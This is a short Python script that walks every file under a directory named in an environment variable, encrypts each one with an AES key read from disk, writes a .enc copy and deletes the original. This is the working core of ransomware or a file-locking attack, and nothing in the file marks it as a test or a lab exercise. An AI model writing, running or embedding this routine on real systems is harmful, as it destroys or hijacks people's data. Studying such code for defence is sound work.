from Crypto.Cipher import AES
from tools import get_venv_var, all_files, delete_file, read_bytes


def encrypt_file(file_name: str, aes_key: bytes) -> None:
    file_data = read_bytes(file_name)

    cipher = AES.new(aes_key, AES.MODE_EAX)

    encrypted_data, tag = cipher.encrypt_and_digest(file_data)

    with open(file_name + '.enc', 'wb') as f:
        f.write(cipher.nonce)
        f.write(tag)
        f.write(encrypted_data)


if __name__ == '__main__':

    TARGET = get_venv_var('TARGET')

    print('target:', TARGET)

    target_files = all_files(TARGET)
    aes_key = read_bytes('aes_key.bin')
    for file in target_files:
        encrypt_file(file, aes_key)
        delete_file(file)
